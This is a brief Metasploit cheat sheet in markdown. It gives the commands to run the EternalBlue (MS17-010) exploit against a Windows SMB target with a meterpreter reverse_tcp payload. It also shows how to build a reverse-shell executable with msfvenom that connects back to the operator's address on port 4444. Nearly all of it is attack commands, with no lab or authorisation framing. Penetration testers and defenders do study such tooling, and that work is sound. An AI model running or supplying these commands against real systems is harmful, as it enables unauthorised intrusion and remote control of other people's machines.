# Metasploit Cheat Sheet

## 🛠 Start Metasploit
```bash
msfconsole
🔍 Search for an Exploit
search windows/smb/ms17_010

🚀 Use an Exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOST target-ip
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

🎯 Create a Reverse Shell Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=your-ip LPORT=4444 -f exe > shell.exe
